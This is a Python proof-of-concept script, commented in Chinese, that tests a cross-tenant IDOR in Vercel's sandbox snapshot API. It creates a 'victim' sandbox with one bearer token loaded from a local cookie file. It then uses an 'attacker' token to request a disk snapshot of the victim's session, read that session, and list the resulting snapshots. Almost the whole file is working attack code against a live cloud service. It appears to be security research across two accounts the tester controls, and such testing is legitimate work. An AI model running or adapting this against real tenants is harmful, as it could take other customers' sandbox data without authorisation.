# -*- coding: utf-8 -*-
"""v45d4: snapshot 端点跨租户 (写入方向 IDOR)
attacker token 对 victim 的 session 调 POST snapshot:
- 201 -> IDOR! (attacker 获得 victim sandbox 磁盘快照)
- 404/403 -> 隔离正确
再验证: attacker 能否列出/恢复该快照"""
import base64, json, sys, time, urllib.request, urllib.error
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TOKEN, TEAM, PROJ

TEAM_V = 'team_jnske5hDpDfj9eDG2PAfDqWf'
PROJ_V = 'prj_LX0QDsEAlWA0uRZvVTunSef3lllF'

def load_token(path):
    for ln in open(path, encoding='utf-8'):
        if ln.startswith('authorization=Bearer '):
            return ln.split('Bearer ')[1].strip()
    raise RuntimeError('no token in ' + path)

TOK_V = load_token(r'F:\scan\vercel_cookies2.txt')

def api_raw(method, path, body=None, tok=None, timeout=120):
    req = urllib.request.Request('https://api.vercel.com' + path, method=method)
    req.add_header('Authorization', 'Bearer ' + (tok or TOKEN))
    req.add_header('Content-Type', 'application/json')
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode(errors='replace')[:900]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace')[:900]
    except Exception as e:
        return -1, 'EXC %s' % str(e)[:120]

def mk_victim():
    """victim 创建 sandbox"""
    api_raw('DELETE', '/v2/sandboxes/vsnap48?teamId=%s&projectId=%s' % (TEAM_V, PROJ_V), tok=TOK_V)
    time.sleep(3)
    for i in range(8):
        c, r = api_raw('POST', '/v4/sandboxes?teamId=%s' % TEAM_V, {"projectId": PROJ_V, "name": 'vsnap48'}, tok=TOK_V)
        if c == 429:
            print('[victim create] 429 retry', flush=True)
            time.sleep(20)
            continue
        break
    print('[victim create] -> %d' % c, flush=True)
    if c != 200:
        return None
    return json.loads(r)['sandbox']['currentSessionId']

if __name__ == '__main__':
    sid_v = mk_victim()
    if not sid_v:
        sys.exit(1)
    print('victim sid =', sid_v, flush=True)
    time.sleep(8)

    print('=== A1: attacker token -> POST snapshot (victim session) ===', flush=True)
    c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/snapshot?teamId=%s' % (sid_v, TEAM), {})
    print('[snap victim-sid] -> %d %s' % (c, (r or '')[:300]), flush=True)

    print('=== A2: attacker token -> GET victim session ===', flush=True)
    c, r = api_raw('GET', '/v2/sandboxes/sessions/%s?teamId=%s' % (sid_v, TEAM))
    print('[get victim sid] -> %d %s' % (c, (r or '')[:200]), flush=True)

    print('=== A3: victim token -> GET victim session (对照) ===', flush=True)
    c, r = api_raw('GET', '/v2/sandboxes/sessions/%s?teamId=%s' % (sid_v, TEAM_V), tok=TOK_V)
    print('[get victim self] -> %d %s' % (c, (r or '')[:200]), flush=True)

    print('=== A4: attacker 列快照 (自己的 project) ===', flush=True)
    c, r = api_raw('GET', '/v2/sandboxes/snapshots?teamId=%s&project=%s&limit=10' % (TEAM, PROJ))
    try:
        d = json.loads(r)
        for s in d.get('snapshots', []):
            print('  %s src=%s status=%s' % (s.get('id'), s.get('sourceSessionId'), s.get('status')), flush=True)
    except Exception:
        print('[list] -> %d %s' % (c, (r or '')[:200]), flush=True)

    # 清理 victim sandbox
    api_raw('DELETE', '/v2/sandboxes/vsnap48?teamId=%s&projectId=%s' % (TEAM_V, PROJ_V), tok=TOK_V)
    print('DONE', flush=True)
